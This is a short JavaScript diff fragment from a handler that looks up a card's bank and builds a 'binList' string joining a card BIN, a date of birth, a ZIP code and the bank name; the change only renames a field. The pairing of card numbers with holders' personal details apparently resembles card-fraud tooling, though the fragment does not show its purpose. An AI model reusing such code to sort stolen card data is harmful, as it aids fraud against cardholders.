@@ -33,7 +33,7 @@ const sendRes = async (req, res) => {
   let bankName;
 
   if (response.data.bank) {
-    bankName = response.data.bank.bankName;
+    bankName = response.data.bank.name;
   }
 
   binList = `${bin} | ${dob} | ${zip} | ${bankName}`;
